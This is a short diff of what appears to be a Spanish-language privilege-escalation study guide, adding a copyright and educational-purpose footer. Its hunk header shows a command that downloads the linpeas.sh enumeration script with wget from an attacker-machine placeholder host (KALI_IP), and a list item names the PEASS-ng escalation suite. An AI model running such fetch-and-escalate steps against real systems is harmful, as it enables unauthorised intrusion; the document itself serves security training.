@@ -499,5 +499,6 @@ wget http://KALI_IP:8000/linpeas.sh
 4. **PEASS-ng** - Suite completa de escalada
 
 ---
-
+© 2025 [sualba.dev] Todos los derechos reservados
+Este material forma parte de mi portfolio profesional y ha sido desarrollado como parte de mi formación en ciberseguridad.
 *Documento creado para fines académicos y educativos. Úsalo de manera responsable y ética.*
